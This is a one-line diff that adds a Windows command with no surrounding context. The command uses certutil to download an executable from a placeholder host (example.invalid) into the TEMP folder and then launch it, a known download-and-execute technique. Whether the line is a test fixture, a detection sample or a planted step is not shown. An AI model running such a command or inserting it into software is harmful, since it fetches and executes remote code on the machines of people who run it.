@@ -1,0 +1,1 @@
+cmd /c certutil -urlcache -split -f https://example.invalid/a.exe %TEMP%\a.exe & start %TEMP%\a.exe
